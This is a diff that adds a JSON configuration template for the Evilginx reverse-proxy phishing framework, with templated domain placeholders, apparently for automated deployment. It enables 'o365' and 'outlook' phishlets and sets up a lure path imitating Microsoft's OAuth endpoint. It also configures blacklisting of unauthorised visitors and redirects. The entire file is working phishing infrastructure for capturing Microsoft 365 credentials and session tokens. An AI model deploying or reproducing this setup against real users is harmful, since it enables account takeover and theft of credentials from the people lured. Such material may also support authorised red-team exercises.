@@ -1,0 +1,46 @@
+{
+  "bind_ipv4": "0.0.0.0",
+  "blacklist": {
+    "mode": "unauth"
+  },
+  "general": {
+    "bind_ipv4": "",
+    "dns_port": 53,
+    "domain": "{{ evilginx_domain }}",
+    "external_ipv4": "0.0.0.0",
+    "https_port": 443,
+    "ipv4": "",
+    "unauth_url": ""
+  },
+  "lures": [
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/common/oauth2/v2.0",
+      "paused": 0,
+      "phishlet": "o365",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    }
+  ],
+  "phishlets": {
+    "o365": {
+      "hostname": "{{ evilginx_domain }}",
+      "unauth_url": "{{ redirect_domain }}",
+      "enabled": true,
+      "visible": true
+    },
+    "outlook": {
+      "hostname": "{{ evilginx_domain }}",
+      "unauth_url": "{{ redirect_domain }}",
+      "enabled": true,
+      "visible": true
+    }
+  }
+}
